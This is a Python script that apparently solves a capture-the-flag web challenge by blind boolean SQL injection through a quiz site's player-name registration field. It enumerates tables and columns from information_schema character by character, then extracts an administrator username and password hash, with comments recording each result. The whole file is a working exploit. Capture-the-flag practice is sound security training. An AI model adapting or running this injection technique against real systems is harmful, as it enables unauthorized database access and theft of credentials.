#!/usr/bin/env python3
# -*- coding:utf-8 -*-

import requests
import random
import string


HOST = "https://bruzz.ctf.bzh/"

s = requests.session()
letters = string.ascii_lowercase + string.ascii_uppercase + string.digits

def get_random_string(length=6):
    # Used for random comment
    result_str = ''.join(random.choice(letters) for i in range(length))
    return result_str

def is_true(inject):
    inject = inject+f" #{get_random_string()}"  # Random comment to avoid same name player
    s.post(f"{HOST}/register", json={"name": inject})  # Play
    rep = s.post(f"{HOST}/quizz", json={"responses": [0, 2, 1, 3]})  # Submit answers
    try:
        nb = int(rep.json()["msg"].split(">")[1].split("<")[0])  # Get players numbers
        return nb > 0
    except:
        return False


for i in range(1, 5):
    r = is_true(f"' OR 1=1 AND (SELECT count(table_name) FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema' ) = {i}")
    if r:
        print(f"[*] Nombre de tables: {i}")
# 2 tables

table = ""
while len(table) < 15:  # While True
    for l in letters:
        r = is_true(f"' OR 1=1 AND (SELECT table_name FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema' LIMIT 1) LIKE '{table+l}%'")
        if r:
            table += l
            print(f"[*] Table: {table}", end="\r")
            break
print(f"[*] Table: {table}")
# Table administrateurs

col = ""
while len(col) < 8:  # While True
    for l in letters:
        r = is_true(f"' OR 1=1 AND (SELECT column_name FROM information_schema.columns WHERE table_name = '{table}' LIMIT 1) LIKE '{col+l}%'")
        if r:
            col += l
            print(f"[*] Column: {col}", end="\r")
            break
print(f"[*] Column: {col}")
# Column username

col = ""
while len(col) < 6:  # While True
    for l in letters:
        r = is_true(f"' OR 1=1 AND (SELECT column_name FROM information_schema.columns WHERE table_name = '{table}' LIMIT 1,1) LIKE '{col+l}%'")
        if r:
            col += l
            print(f"[*] Column: {col}", end="\r")
            break
print(f"[*] Column: {col}")
# Column passwd


user = ""
while len(user) < 13:  # While True
    for l in letters+".":
        r = is_true(f"' OR 1=1 AND (SELECT 1 FROM administrateurs WHERE username LIKE '{user+l}%') = 1")
        if r:
            user += l
            print(f"[*] Username: {user}", end="\r")
            break
print(f"[*] Username: {user}")
# Username (julien.lepers)

pwd = ""
while len(pwd) < 40:  # While True
    for l in letters+".":
        r = is_true(f"' OR 1=1 AND (SELECT 1 FROM administrateurs WHERE passwd LIKE '{pwd+l}%') = 1")
        if r:
            pwd += l
            print(f"[*] Password: {pwd}", end="\r")
            break
print(f"[*] Password: {pwd}")
# Username (ff19f7e740cdecdcc4e3bc182b8c9b8d19a7072c)


